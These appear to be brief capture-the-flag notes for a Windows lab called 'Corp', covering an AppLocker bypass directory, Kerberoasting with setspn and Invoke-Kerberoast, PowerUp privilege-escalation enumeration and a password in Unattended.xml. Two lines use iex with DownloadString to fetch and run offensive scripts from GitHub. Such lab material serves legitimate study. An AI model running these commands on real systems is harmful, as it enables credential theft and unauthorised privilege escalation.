# Corp 

## Bypassing Applocker
- By default `C:\Windows\System32\spool\drivers\color` is a whitelisted directory by AppLocker.
- Powershell history file is located in `%userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`

## Kerberoasting 
- Video for reference [SANS Webcast: Kerberos & Attacks 101](https://youtu.be/LmbP-XD1SC8)

### Enumerating windows 
- Lists all accounts in the SPN - Mapping between service and account
```
setspn -T medin -Q */*
```

### Obtaining an SPN ticket
- Downloading the script 
```
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 
```
- Using the script
```
Invoke-Kerberoast -OutputFormat hashcat | fl
```

## Privilege Escalation
- Script for enumeration
```
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
```
- Several ways of getting Administrator access must have been listed after running this script

- Using UnattendPath way to gain Administrator access
The user password is stored in encoded format in `C:\Windows\Panther\Unattend\Unattended.xml`
